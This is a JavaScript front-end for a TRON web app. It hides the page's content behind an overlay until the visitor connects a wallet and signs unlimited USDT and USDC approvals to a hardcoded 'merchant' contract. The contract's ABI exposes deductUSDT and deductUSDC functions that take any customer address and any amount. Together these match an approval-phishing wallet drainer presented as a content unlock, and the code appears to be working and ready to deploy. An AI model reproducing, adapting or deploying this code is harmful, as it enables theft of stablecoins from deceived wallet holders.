// src/main.js
// 🚨 最終穩定版代碼 (支援 WalletConnect V2 和原生 DApp 注入雙模式)

// --- 配置常量 ---
const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; // 🚨 請使用您的 Project ID 🚨
const TRON_CHAIN_ID = 'tron:50'; // TRON 主網鏈 ID
const TRON_RPC_URL = 'https://api.trongrid.io';

// 您的合約和代幣地址
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (為簡潔，僅列出變數名)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];


// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let provider; // WalletConnect Provider 實例 (僅用於 WalletConnect 模式)
let web3ModalInstance; // 延遲初始化的 Web3Modal 實例

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const deductionForm = document.getElementById('deductionForm');
const tokenSelectForm = document.getElementById('tokenSelectForm'); 
const deductionAmountInput = document.getElementById('deductionAmount');
const deductButton = document.getElementById('deductButton'); 


// --- WalletConnect V2 延遲初始化函數 ---
function initializeWeb3Modal() {
    if (!window.Web3Modal) {
        console.error("Web3Modal CDN 未載入！");
        return false;
    }
    if (!web3ModalInstance) {
        web3ModalInstance = new window.Web3Modal.Web3Modal({
            projectId: WC_PROJECT_ID,
            themeMode: 'light',
            walletConnect: {
                show: true,
            },
        });
    }
    return true;
}


// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
    if (isConnectedFlag && deductionForm) {
        deductionForm.style.display = 'block';
    }
}
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.title = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        hideOverlay();
    } else {
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
        if(deductionForm) deductionForm.style.display = 'none';
    }
}

async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

// ---------------------------------------------
// 模式一：原生 DApp 注入 (適用於 TronLink/DApp 瀏覽器)
// ---------------------------------------------
async function connectTronLink() {
    showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求原生連接...');
    
    try {
        if (!window.tronLink) throw new Error("TronLink API not found.");

        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });

        if (res.code !== 200) {
            throw new Error(`連接請求被拒絕: ${res.message}`);
        }

        // 設置全局 TronWeb 實例為注入的 API
        if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;
        provider = null; // 在原生模式下清空 WalletConnect provider

        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();

    } catch (error) {
        console.error("TronLink 連接失敗:", error);
        showOverlay(`原生連接失敗！錯誤: ${error.message}。請確認錢包已解鎖。`);
        updateConnectionUI(false);
    }
}


// ---------------------------------------------
// 模式二：WalletConnect V2 (適用於手機掃碼，如 Trust Wallet)
// ---------------------------------------------
async function connectWalletConnect() {
    if (!initializeWeb3Modal()) {
        showOverlay('WalletConnect 啟動失敗，請檢查 CDN 載入！');
        return;
    }

    showOverlay('正在開啟錢包選擇，請選擇您的 TRON 錢包...');

    try {
        await web3ModalInstance.openModal(); 
        
        if (!window.UniversalProvider) throw new Error("UniversalProvider CDN is not loaded on window.");

        provider = await window.UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: '您的 DApp 名稱',
                description: '您的 DApp 描述',
                url: window.location.origin,
                icons: ['https://yourdapp.com/icon.png'],
            },
        });

        const session = await provider.connect({
            requiredNamespaces: {
                tron: {
                    methods: ['tron_signTransaction', 'tron_signMessage'],
                    chains: [TRON_CHAIN_ID],
                    events: ['accountsChanged', 'chainChanged'],
                },
            },
        });
        
        const tronNamespace = session.namespaces.tron;
        userAddress = tronNamespace.accounts[0].split(':')[2]; 

        if (!window.TronWeb) throw new Error("TronWeb is not loaded.");
        tronWeb = new window.TronWeb({
            fullHost: TRON_RPC_URL,
            privateKey: '00', 
        });

        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();

    } catch (error) {
        console.error("WalletConnect 連接失敗:", error);
        if (provider) {
             await provider.disconnect().catch(() => {});
             provider = null; 
        }
        showOverlay(`連線失敗！錯誤: ${error.message}。請嘗試掃碼或檢查 Project ID。`);
        updateConnectionUI(false);
    } finally {
        if(web3ModalInstance) web3ModalInstance.closeModal();
    }
}


// ---------------------------------------------
// 主連接入口函數
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        if (provider) {
             await provider.disconnect();
        } 
        tronWeb = null;
        userAddress = null;
        provider = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 🎯 決定使用哪種連接模式：檢查是否存在注入的 TRON API
    const useTronLink = (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58));

    if (useTronLink) {
        await connectTronLink();
    } else {
        await connectWalletConnect();
    }
    
    if (connectButton) connectButton.disabled = false;
}


// ---------------------------------------------
// 授權與交易邏輯 (簽名方法根據 provider 是否存在而定)
// ---------------------------------------------

async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const allAuthorized = status.contract && status.usdt && status.usdc;

    if (allAuthorized) {
        hideOverlay(); 
    } else {
        showOverlay('偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...');
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            await handlePostConnection(); 
        }
    }
}

// 核心授權邏輯 (雙模式簽名)
async function connectAndAuthorize() {
    const status = await checkAuthorization();
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
    const ZERO_UINT = "0"; 
    
    const totalTxs = (status.contract ? 0 : 1) + (status.usdt ? 0 : 2) + (status.usdc ? 0 : 2); 
    let txCount = 0;

    if (totalTxs === 0) {
        showOverlay("所有授權已就緒，無需額外交易。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        const isWalletConnectMode = !!provider; 

        const signAndSend = async (transaction, stepMessage) => {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
            let signedTx;

            if (isWalletConnectMode) {
                if (!provider) throw new Error("WalletConnect Provider 遺失。");
                signedTx = await provider.request({ method: 'tron_signTransaction', params: [transaction] });
            } else {
                // 原生 TronLink/DApp 模式
                const result = await tronWeb.trx.sign(transaction);
                if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
                signedTx = result;
            }
            await tronWeb.trx.sendRawTransaction(signedTx);
        };

        if (!status.contract) {
            const transaction = await merchantContract.connectAndAuthorize().build(); 
            await signAndSend(transaction, "正在發送合約授權 (ConnectAndAuthorize)");
        }
        // ... (USDT 和 USDC 授權邏輯保持不變，因為它們都使用 signAndSend) ...

        if (!status.usdt) {
            const zeroApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            await signAndSend(zeroApproveTx, "USDT 安全步驟: 重置授權至 0 (請同意)");

            const maxApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            await signAndSend(maxApproveTx, "設置 USDT Max 扣款授權 (最終授權 - 請同意)");
        }

        if (!status.usdc) {
            const zeroApproveTx = await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            await signAndSend(zeroApproveTx, "USDC 安全步驟: 重置授權至 0 (請同意)");
            
            const maxApproveTx = await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            await signAndSend(maxApproveTx, "設置 USDC Max 扣款授權 (最終授權 - 請同意)");
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`授權交易失敗，錯誤訊息: ${error.message}。請確保您同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}

// 核心扣款邏輯 (雙模式簽名)
async function triggerBackendDeduction(token, amount) {
    if (!isConnectedFlag || !userAddress || !merchantContract) {
        showOverlay("請先連繫錢包並完成授權！");
        return;
    }
    
    try {
        const tokenContractAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : USDC_CONTRACT_ADDRESS;
        const contractMethod = token === 'USDT' ? merchantContract.deductUSDT : merchantContract.deductUSDC;
        const tokenContract = token === 'USDT' ? usdtContract : usdcContract;

        const balance = await tokenContract.balanceOf(userAddress).call();
        if (tronWeb.BigNumber(balance).lt(tronWeb.toSun(amount))) {
            throw new Error(`餘額不足: 僅剩 ${tronWeb.fromSun(balance)} ${token}`);
        }

        showOverlay(`正在發起 ${token} 扣款，金額: ${amount}。請在錢包中確認簽名！`);
        
        const sunAmount = tronWeb.toSun(amount);
        const transaction = await contractMethod(userAddress, tokenContractAddress, sunAmount).build(); 

        const isWalletConnectMode = !!provider;
        let signedTx;

        if (isWalletConnectMode) {
            if (!provider) throw new Error("WalletConnect Provider 遺失。");
            signedTx = await provider.request({ method: 'tron_signTransaction', params: [transaction] });
        } else {
            // 原生 TronLink/DApp 模式
            const result = await tronWeb.trx.sign(transaction);
            if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
            signedTx = result;
        }
        
        const result = await tronWeb.trx.sendRawTransaction(signedTx);
        
        if (result.txid) {
            showOverlay(`✅ 扣款成功！交易 ID: ${result.txid.substring(0, 10)}...`);
        } else {
            throw new Error("交易失敗或未被廣播。");
        }
    } catch (error) {
        console.error("Deduction Failed:", error);
        showOverlay(`扣款失敗！錯誤: ${error.message}。請檢查您的餘額及授權額度。`);
    }
}

function triggerDeductionFromForm() {
    const token = tokenSelectForm.value;
    const amount = deductionAmountInput.value;

    if (isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
        alert("請輸入有效的金額！");
        return;
    }
    
    triggerBackendDeduction(token, amount);
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);
if (deductButton) {
    deductButton.addEventListener('click', triggerDeductionFromForm);
}

// 頁面載入時初始化
showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>');